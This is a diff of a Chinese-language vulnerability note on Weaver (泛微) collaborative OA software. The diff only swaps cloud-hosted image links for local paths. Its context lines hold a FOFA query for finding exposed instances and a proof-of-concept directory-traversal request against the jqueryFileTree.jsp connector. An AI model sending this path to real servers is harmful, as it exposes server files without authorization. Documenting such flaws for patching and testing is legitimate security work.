@@ -20,7 +20,7 @@ app="泛微-协同办公OA"
 
 登录页面
 
-![1](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131045944.png)
+![1](./images/202209131045944.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="泛微-协同办公OA"
 /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
 ```
 
-![2](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131046623.png)
+![2](./images/202209131046623.png)
